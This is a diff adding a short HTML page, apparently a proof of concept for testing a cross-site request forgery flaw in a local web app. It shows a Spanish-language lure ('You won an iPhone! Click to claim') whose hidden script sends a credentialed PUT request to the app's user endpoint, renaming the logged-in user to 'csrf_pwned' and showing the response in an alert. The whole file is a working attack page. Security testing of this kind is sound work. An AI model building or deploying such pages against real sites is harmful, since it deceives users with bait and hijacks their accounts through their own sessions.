@@ -1,0 +1,20 @@
+<html>
+<body>
+<h1>Has ganado un iPhone! Haz click para reclamar</h1>
+<script>
+  fetch("http://localhost:6101/api/usuarios/me", {
+    method: "PUT",
+    credentials: "include",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({"username": "csrf_pwned"})
+  })
+  .then(r => r.json())
+  .then(d => {
+    alert("CSRF ejecutado! Respuesta: " + JSON.stringify(d));
+  })
+  .catch(e => {
+    alert("Error: " + e);
+  });
+</script>
+</body>
+</html>
